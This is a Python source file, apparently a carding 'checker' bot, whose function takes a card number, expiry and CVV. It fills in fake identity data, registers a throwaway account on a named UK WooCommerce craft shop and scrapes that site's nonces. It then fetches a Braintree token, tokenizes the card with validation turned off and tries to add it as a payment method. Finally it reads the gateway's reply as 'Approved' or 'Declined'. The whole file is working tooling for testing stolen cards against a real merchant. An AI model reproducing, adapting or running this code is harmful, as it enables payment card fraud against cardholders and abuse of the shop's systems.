from all.configs._def_main_ import *

async def violet(cc, mes, ano, cvv) -> str:

    if cc.startswith('4'):
        card_type = "visa"
    elif cc.startswith('5'):
        card_type = "master-card"
    elif cc.startswith('6'):
        card_type = "discover"
    elif cc.startswith('3'):
        card_type = "american-express"

    ano = f'20{ano}' if len(ano) == 2 else ano

    Status = "Api Error! ♻️"

    try:
        print(Fore.BLUE + "[ + ] Datos Ingresados Correctamente" + Fore.RESET)

        ssl_context = ssl.create_default_context(cafile=certifi.where())
        conn = aiohttp.TCPConnector(ssl=ssl_context)
        async with aiohttp.ClientSession(connector=conn) as session:

            async with session.get("https://random-data-api.com/api/v2/users?size=2&is_xml=true") as response:
                user = await response.text()
                name = parseX(user, '"first_name":"', '"')
                apell = parseX(user, '"last_name":"', '"')
                email = parseX(user, '"email":"', '"')

                print(f"{name} + {apell} + {email}")

                numero_dis = random.randint(1, 9999)
                contra = name + apell + str(numero_dis)
                correo = email
                numero_dis = random.randint(1, 9999)
                numero_telefono = random.randint(9876655444, 9998765433)

            async with session.get(f"https://www.bestrandoms.com/random-address-in-us?quantity=1", headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36", "Pragma": "no-cache", "Accept": "*/*"}) as response:
                address = await response.text()
                street = parseX(address, 'Street:</b>&nbsp;&nbsp;', '<')
                state = parseX(
                    address, 'State/province/area: </b>&nbsp;&nbsp;', '<')
                print(f"{street} + {state}")

            head = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'referer': 'https://www.artandcraftfactory.co.uk/',
                'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'
            }
            async with session.get('https://www.artandcraftfactory.co.uk/my-account/', headers=head, timeout=22) as response:
                req = await response.text()
                register_nonce = find_between(
                    req, 'woocommerce-register-nonce" value="', '"')
                print(register_nonce)

            if register_nonce is None:
                Status = "Api Error! ♻️"
                Response = "Error getting token 1 (E1: SITE ERROR)"
            else:
                head = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://www.artandcraftfactory.co.uk',
                    'referer': 'https://www.artandcraftfactory.co.uk/my-account/',
                    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
                }
                data = {
                    'email': correo,
                    'password': apell.upper() + name.lower() + str(random.randint(1, 200)),
                    'woocommerce-register-nonce': register_nonce,
                    '_wp_http_referer': '/my-account/',
                    'register': 'Register',
                }

                async with session.post('https://www.artandcraftfactory.co.uk/my-account/', headers=head, data=data, timeout=25) as response:
                    pass

                head = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'referer': 'https://www.artandcraftfactory.co.uk/my-account/edit-address/',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
                }

                async with session.get('https://www.artandcraftfactory.co.uk/my-account/edit-address/billing/', headers=head, timeout=18) as response:
                    req = await response.text()
                    address_nonce = find_between(
                        req, 'woocommerce-edit-address-nonce" value="', '"')
                    print(address_nonce)

                if address_nonce is None:
                    raise ValueError("REQ ERROR: Address Nonce is missing.")

                if address_nonce is None:
                    Status = "Api Error! ♻️"
                    Response = "Error getting token 2 (E2: RANDOM DATA ERROR)"
                else:
                    headers = {
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                        'content-type': 'application/x-www-form-urlencoded',
                        'origin': 'https://www.artandcraftfactory.co.uk',
                        'referer': 'https://www.artandcraftfactory.co.uk/my-account/edit-address/billing/',
                        'sec-fetch-user': '?1',
                        'upgrade-insecure-requests': '1',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
                    }
                    data = {
                        'billing_first_name': name,
                        'billing_last_name': apell,
                        'billing_company': '',
                        'billing_email': correo,
                        'billing_address_1': street,
                        'billing_phone': numero_telefono,
                        'billing_address_2': '',
                        'billing_country': 'GB',
                        'billing_city': state,
                        'billing_state': '',
                        'billing_postcode': 'AB42 9EX',
                        'purchase_order_number': '',
                        'save_address': 'Save address',
                        'woocommerce-edit-address-nonce': address_nonce,
                        '_wp_http_referer': '/my-account/edit-address/billing/',
                        'action': 'edit_address',
                    }
                    async with session.post('https://www.artandcraftfactory.co.uk/my-account/edit-address/billing/', headers=headers, data=data, timeout=18) as response:
                        pass

                    headers = {
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                        'referer': 'https://www.artandcraftfactory.co.uk/my-account/edit-address/',
                        'sec-fetch-user': '?1',
                        'upgrade-insecure-requests': '1',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
                    }

                    async with session.get('https://www.artandcraftfactory.co.uk/my-account/add-payment-method/', headers=headers, timeout=18) as response:
                        req = await response.text()
                        addpayment_nonce = find_between(
                            req, 'woocommerce-add-payment-method-nonce" value="', '"')
                        client_token_nonce = find_between(
                            req, 'client_token_nonce":"', '"')
                        print(f"{addpayment_nonce} + {client_token_nonce}")

                    if addpayment_nonce is None or client_token_nonce is None:
                        raise ValueError(
                            "REQ ERROR: nonce_payment and client_token is not captured.")

                    if addpayment_nonce is None or client_token_nonce is None:
                        Status = "Api Error! ♻️"
                        Response = "Error getting token 3 (E1: SITE ERROR)"
                    else:
                        headers = {
                            'accept': '*/*',
                            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                            'origin': 'https://www.artandcraftfactory.co.uk',
                            'referer': 'https://www.artandcraftfactory.co.uk/my-account/add-payment-method/',
                            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
                            'x-requested-with': 'XMLHttpRequest',
                        }
                        data = {
                            'action': 'wc_braintree_credit_card_get_client_token',
                            'nonce': client_token_nonce,
                        }
                        async with session.post('https://www.artandcraftfactory.co.uk/wp-admin/admin-ajax.php',
                                                headers=headers, data=data, timeout=22) as response:
                            req = await response.json()
                            client_token = req["data"]
                            braintree_bearer = base64.b64decode(client_token)
                            braintree_bearer = str(braintree_bearer)
                            bearer = find_between(
                                braintree_bearer, 'authorizationFingerprint":"', '"')
                            print(bearer)
                        if bearer is None:
                            Status = "Api Error! ♻️"
                            Response = "Error getting token 4 (E1: SITE ERROR)"
                        else:
                            head = {
                                'Accept': '*/*',
                                'Authorization': f'Bearer {bearer}',
                                'Braintree-Version': '2018-05-10',
                                'Connection': 'keep-alive',
                                'Content-Type': 'application/json',
                                'Origin': 'https://assets.braintreegateway.com',
                                'Referer': 'https://assets.braintreegateway.com/',
                                'Sec-Fetch-Dest': 'empty',
                                'Sec-Fetch-Mode': 'cors',
                                'Sec-Fetch-Site': 'cross-site',
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
                                'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
                                'sec-ch-ua-mobile': '?0',
                                'sec-ch-ua-platform': '"Windows"'
                            }
                            data = {
                                'clientSdkMetadata': {
                                    'source': 'client',
                                    'integration': 'custom',
                                    'sessionId': braintree_generate_uuid(),
                                },
                                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
                                'variables': {
                                    'input': {
                                        'creditCard': {
                                            'number': cc,
                                            'expirationMonth': mes,
                                            'expirationYear': ano,
                                            'cvv': cvv,
                                        },
                                        'options': {
                                            'validate': False,
                                        },
                                    },
                                },
                                'operationName': 'TokenizeCreditCard',
                            }
                            async with session.post('https://payments.braintree-api.com/graphql', headers=head, json=data) as response:
                                req = await response.json()
                                card_token = req[
                                    "data"]["tokenizeCreditCard"]["token"]
                                correlation_id = braintree_generate_correlation_id()
                                print(f"{card_token} + {correlation_id}")

                            headers = {
                                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                                'content-type': 'application/x-www-form-urlencoded',
                                'origin': 'https://www.artandcraftfactory.co.uk',
                                'referer': 'https://www.artandcraftfactory.co.uk/my-account/add-payment-method/',
                                'sec-fetch-user': '?1',
                                'upgrade-insecure-requests': '1',
                                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
                            }

                            data = {
                                'payment_method': 'braintree_credit_card',
                                'wc-braintree-credit-card-card-type': card_type,
                                'wc-braintree-credit-card-3d-secure-enabled': '',
                                'wc-braintree-credit-card-3d-secure-verified': '',
                                'wc-braintree-credit-card-3d-secure-order-total': '0.00',
                                'wc_braintree_credit_card_payment_nonce': card_token,
                                'wc_braintree_device_data': '{"correlation_id":"'f'{correlation_id}''"}',
                                'wc-braintree-credit-card-tokenize-payment-method': 'true',
                                'woocommerce-add-payment-method-nonce': addpayment_nonce,
                                '_wp_http_referer': '/my-account/add-payment-method/',
                                'woocommerce_add_payment_method': '1',
                            }
                            async with session.post('https://www.artandcraftfactory.co.uk/my-account/add-payment-method/',
                                                    headers=headers, data=data, timeout=22) as response:
                                req = await response.text()
                                api_rest = req
                                response_map = {
                                    'Card Issuer Declined CVV': ("Approved! 🟩", None),
                                    'Fund': ("Approved! 🟩", None),
                                    'fund': ("Approved! 🟩", None),
                                    'cvv': ("Approved! 🟩", (':', '"')),
                                    'avs': ("Approved! 🟩", (':', '"')),
                                    'risk_threshold': ("Declined! 🟥", (':', '"'))
                                }
                                if 'New payment method added' in api_rest:
                                    Status = "Approved! 🟩"
                                    Response = "1000: Approved"
                                elif 'woocommerce-error' in req:
                                    api_response = find_between(
                                        req, 'Status code', '</li').strip()

                                    for keyword, (status, response_boundaries) in response_map.items():
                                        if keyword in api_response:
                                            Status = status
                                            if response_boundaries is None:
                                                Response = api_response
                                            else:
                                                api_response = f'{api_response}"'
                                                Response = find_between(
                                                    api_response, *response_boundaries)
                                            break
                                    else:
                                        Status = "Declined! 🟥"
                                        Response = api_response
                                else:
                                    Status = "Api Error! ♻️"
                                    Response = "Error getting Braintree response (E1: TRY AGAIN)"

                                print(Status, Response)
                                return (Status, Response)

    except Exception as e:
        print(f"[ ! ] Ocurrio un error: {e}")